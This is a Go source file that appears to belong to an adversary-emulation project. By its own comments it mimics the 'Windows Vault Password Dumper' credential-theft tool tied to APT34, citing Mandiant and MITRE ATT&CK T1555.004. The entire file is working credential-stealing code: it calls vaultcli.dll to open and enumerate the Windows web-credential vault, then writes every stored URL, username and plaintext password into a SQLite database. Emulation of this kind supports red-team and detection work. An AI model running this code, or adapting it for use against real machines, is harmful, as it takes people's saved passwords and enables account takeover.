// vault.go
// Functions and data types based on danieljoos/winvault Github repository (https://github.com/danieljoos/winvault)
// Adapted to behave like “Windows Vault Password Dumper” browser credential theft tool
// from Massimiliano Montoro, the developer of Cain & Abel.
//
// CTI Sources
// https://www.mandiant.com/resources/hard-pass-declining-apt34-invite-to-join-their-professional-network

package vault

import (
	"db"
	"github.com/google/uuid"
	"golang.org/x/sys/windows"
	"reflect"
	"syscall"
	"unicode/utf16"
	"unsafe"
)

var (
	vaultcli             = syscall.NewLazyDLL("vaultcli.dll")
	pVaultOpenVault      = vaultcli.NewProc("VaultOpenVault")
	pVaultEnumerateItems = vaultcli.NewProc("VaultEnumerateItems")
	pVaultGetItem        = vaultcli.NewProc("VaultGetItem")
)

type vaultElement struct {
	ID   int32
	_    int32
	Type int32
	_    int32
}

type vaultElementString struct {
	vaultElement
	Data *uint16
}

type vaultItemWin8 struct {
	ID              uuid.UUID
	Name            *uint16
	Resource        *vaultElement
	Identity        *vaultElement
	Authenticator   *vaultElement
	PackageSid      uintptr
	Filetime        syscall.Filetime
	Flags           uint32
	PropertiesCount uint32
	Properties      uintptr
}

type vaultItemWin7 struct {
	ID              uuid.UUID
	Name            *uint16
	Resource        *vaultElement
	Identity        *vaultElement
	Authenticator   *vaultElement
	Filetime        syscall.Filetime
	Flags           uint32
	PropertiesCount uint32
	Properties      uintptr
}

func convertToVaultItemElement(elem *vaultElement) string {
	if elem != nil {
		return utf16PtrToString((*vaultElementString)(unsafe.Pointer(elem)).Data)
	}
	return ""
}

func utf16PtrToString(wstr *uint16) string {
	if wstr != nil {
		for len := 0; ; len++ {
			ptr := unsafe.Pointer(uintptr(unsafe.Pointer(wstr)) + uintptr(len)*unsafe.Sizeof(*wstr)) // see https://golang.org/pkg/unsafe/#Pointer (3)
			if *(*uint16)(ptr) == 0 {
				return string(utf16.Decode(*(*[]uint16)(unsafe.Pointer(&reflect.SliceHeader{
					Data: uintptr(unsafe.Pointer(wstr)),
					Len:  len,
					Cap:  len,
				}))))
			}
		}
	}
	return ""
}

// MITRE ATT&CK Technique: T1555.004 - Credentials from Password Stores: Windows Credential Manager
func DumpVaultWin8(database *db.SQLiteRepository) bool {
	var pBuffer uintptr
	var count int
	var vaultDirWebCreds = uuid.Must(uuid.Parse("42c4f44b-8a9b-a041-b380-dd4a704ddb28")) // vault dir
	var hVault syscall.Handle
	res, _, _ := pVaultOpenVault.Call(
		uintptr(unsafe.Pointer(&vaultDirWebCreds)),
		0,
		uintptr(unsafe.Pointer(&hVault)),
	)

	if res != 0 {
		return false
	}

	res, _, _ = pVaultEnumerateItems.Call(
		uintptr(hVault),
		512,
		uintptr(unsafe.Pointer(&count)),
		uintptr(unsafe.Pointer(&pBuffer)))

	if res != 0 {
		return false
	}

	itemsSlice := *(*[]vaultItemWin8)(unsafe.Pointer(&reflect.SliceHeader{
		Data: pBuffer,
		Len:  count,
		Cap:  count,
	}))
	for _, pItem := range itemsSlice {
		var pBuffer2 *vaultItemWin8
		res, _, _ := pVaultGetItem.Call(
			uintptr(hVault),
			uintptr(unsafe.Pointer(&pItem.ID)),
			uintptr(unsafe.Pointer(pItem.Resource)),
			uintptr(unsafe.Pointer(pItem.Identity)),
			pItem.PackageSid,
			0,
			0,
			uintptr(unsafe.Pointer(&pBuffer2)),
		)
		if res != 0 {
			return false
		}
		url := convertToVaultItemElement(pBuffer2.Resource)
		username := convertToVaultItemElement(pBuffer2.Identity)
		password := convertToVaultItemElement(pBuffer2.Authenticator)
		err := database.InsertLogin(url, username, password)
		if err != nil {
			return false
		}
	}

	return true
}

// MITRE ATT&CK Technique: T1555.004 - Credentials from Password Stores: Windows Credential Manager
func DumpVaultWin7(database *db.SQLiteRepository) bool {
	var pBuffer uintptr
	var count int
	var vaultDirWebCreds = uuid.Must(uuid.Parse("42c4f44b-8a9b-a041-b380-dd4a704ddb28")) // vault dir
	var hVault syscall.Handle
	res, _, _ := pVaultOpenVault.Call(
		uintptr(unsafe.Pointer(&vaultDirWebCreds)),
		0,
		uintptr(unsafe.Pointer(&hVault)),
	)

	if res != 0 {
		return false
	}

	res, _, _ = pVaultEnumerateItems.Call(
		uintptr(hVault),
		512,
		uintptr(unsafe.Pointer(&count)),
		uintptr(unsafe.Pointer(&pBuffer)))

	if res != 0 {
		return false
	}

	itemsSlice := *(*[]vaultItemWin7)(unsafe.Pointer(&reflect.SliceHeader{
		Data: pBuffer,
		Len:  count,
		Cap:  count,
	}))
	for _, pItem := range itemsSlice {
		var pBuffer2 *vaultItemWin7
		res, _, _ := pVaultGetItem.Call(
			uintptr(hVault),
			uintptr(unsafe.Pointer(&pItem.ID)),
			uintptr(unsafe.Pointer(pItem.Resource)),
			uintptr(unsafe.Pointer(pItem.Identity)),
			0,
			0,
			uintptr(unsafe.Pointer(&pBuffer2)),
		)
		if res != 0 {
			return false
		}
		url := convertToVaultItemElement(pBuffer2.Resource)
		username := convertToVaultItemElement(pBuffer2.Identity)
		password := convertToVaultItemElement(pBuffer2.Authenticator)
		err := database.InsertLogin(url, username, password)
		if err != nil {
			return false
		}
	}

	return true
}

func IsWindows8orGreater() bool {
	ver, _ := windows.GetVersion()
	verMajor := byte(ver)
	verMinor := uint8(ver >> 8)
	if verMajor > 6 {
		return true
	}
	return (verMajor == 6 && verMinor >= 2)
}

func DumpVault(database *db.SQLiteRepository) {
	if IsWindows8orGreater() {
		DumpVaultWin8(database)
	} else {
		DumpVaultWin7(database)
	}
}
